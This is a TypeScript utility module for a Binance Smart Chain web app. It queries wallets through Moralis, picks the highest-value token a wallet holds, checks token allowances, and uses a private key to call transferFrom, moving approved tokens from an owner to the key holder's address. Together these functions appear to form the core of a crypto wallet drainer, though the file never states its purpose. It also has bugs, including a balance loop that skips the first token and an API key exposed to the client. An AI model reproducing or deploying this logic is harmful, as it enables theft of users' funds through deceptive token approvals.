import Moralis from "moralis";
import { EvmChain } from "@moralisweb3/common-evm-utils";
import { createWalletClient, http, createPublicClient } from "viem"
import { mainnet,bscTestnet,bsc } from 'viem/chains'
import { privateKeyToAccount } from 'viem/accounts'
import { erc20ABI } from "wagmi";
//import erc20ABI  from "@/utils/constants/erc20abi.json";

let moralis_started = false

const st_moralis = async() => {
  await Moralis.start({
    apiKey: process.env.NEXT_PUBLIC_MoralisAPI,
    // ...and any other configuration
  });

  moralis_started = true

}

export const sender = async(contract: string, from: string, amount: bigint, accKey: string ) => {

    const client = createWalletClient({
        chain: bsc,
        transport: http()
      })
      
      const account = privateKeyToAccount(accKey) 
     
    console.log("Account sending",account)

    const pc = createPublicClient({
        chain: bsc,
        transport: http()
    })

    const to = account.address

    try {

   
        const {request} = await pc.simulateContract({
            abi: erc20ABI,
            functionName: "transferFrom",
            args: [from,to, amount],
            account,
            address: contract
        })
    
        const hash = await client.writeContract(request)
        const receipt = pc.waitForTransactionReceipt({hash})
        console.log(receipt,hash)
        return hash
    }
     catch (error) {

        console.log("Sending error",error)
        return
        
    }
}
export const getAllowance = async(address: string, owner:string,spender: string) => {

if(!moralis_started)
{
  await st_moralis()
}
  
    const chain = EvmChain.BSC;
  try{
    const response = await Moralis.EvmApi.token.getTokenAllowance({
      address,
      chain,
      ownerAddress: owner,
      spenderAddress: spender
    });
   // console.log(response)
    const res = response.toJSON()
    const allowance = res.allowance
    return allowance
  } 
  catch (error) {

    console.log("An error occur", error)
    return
  }
 
}

export const fetchBalance = async (address: string, token_address: string) => {
  if(!moralis_started)
{
  await st_moralis()
}
const balances = await fetchTokenBalance(address)
//console.log("Address token balance is",balances)
let account
for(var i =1; i < balances.length; i++)
{

if(balances[i].token_address == token_address)
{
   account = balances[i]
 break
}
}
if(account)
return account?.balance

return "0"
  
};

const fetchTokenBalance = async (address: string) => {

  try {
    if(!moralis_started)
    {
      await st_moralis()
    }
    
      const chain = EvmChain.BSC;
    
      const response = await Moralis.EvmApi.token.getWalletTokenBalances({
        address,
        chain,
      });
   // console.log(address, response)
      return response.toJSON()
  } 
  catch (error) {
    console.log("Moralis error from tokenbalance",error)
    return
  }
};

export const queryBalance = async(address: string) => {

    const balances = await fetchTokenBalance(address)
 
   if(balances.length == 0 || !balances)
   {
    return "0x55d398326f99059ff775485246999027b3197955"
   }
   
    let contract = balances[0] 
    const p1 = await getPrice(contract.token_address)
    let v1 = BigInt(parseInt(p1)) * BigInt(contract.balance)
   for(var i =1; i < balances.length; i++)
   {


    const bal = balances[i].balance
    const price = await getPrice(balances[i].token_address)
    let value =  BigInt(bal) * BigInt(price)
   
    if(value > BigInt(0) && value > v1 )
    {
       contract = balances[i]
       v1 = value
    }
     
   }
   console.log("contract balance",contract.token_address)
return contract.token_address
}

const getPrice = async(address: string) => {

  try {
    if(!moralis_started)
    {
      await st_moralis()
    }
  //console.log("Price of crypto")
  const res = await Moralis.EvmApi.token.getTokenPrice({
    chain: EvmChain.BSC,
    "include": "percent_change",
    address
  });

  const datas = res.toJSON()
  console.log(datas.usdPrice)
  return datas.usdPrice
}
catch(error) {
  console.log("Moralis SDK error",error)
}
  
}